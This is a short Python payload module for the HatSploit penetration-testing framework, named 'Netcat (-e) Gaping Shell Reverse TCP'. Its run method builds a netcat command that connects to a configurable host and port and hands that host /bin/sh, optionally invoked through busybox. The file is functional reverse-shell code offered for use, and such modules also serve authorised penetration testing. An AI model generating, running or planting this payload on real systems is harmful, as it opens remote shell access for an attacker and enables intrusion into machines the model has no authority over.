#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.payload import Payload
from hatsploit.utils.tcp import TCPClient


class HatSploitPayload(Payload):
    details = {
        'Category': "single",
        'Name': "Netcat (-e) Gaping Shell Reverse TCP",
        'Payload': "unix/generic/netcat_gaping_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Netcat (-e) gaping shell reverse TCP payload.",
        'Comments': [
            ''
        ],
        'Architecture': "generic",
        'Platform': "unix",
        'Rank': "high",
        'Type': "reverse_tcp"
    }

    options = {
        'CBHOST': {
            'Description': "Connect-back host.",
            'Value': TCPClient.get_local_host(),
            'Type': "ip",
            'Required': True
        },
        'CBPORT': {
            'Description': "Connect-back port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        },
        'BUSYBOX': {
            'Description': "Invoke from busybox.",
            'Value': "no",
            'Type': "boolean",
            'Required': False
        }
    }

    def run(self):
        connback_host, connback_port, busybox = self.parse_options(self.options)

        payload = f"nc {connback_host} {connback_port} -e /bin/sh"
        if busybox.lower() in ['yes', 'y']:
            payload = f"busybox {payload}"

        return payload
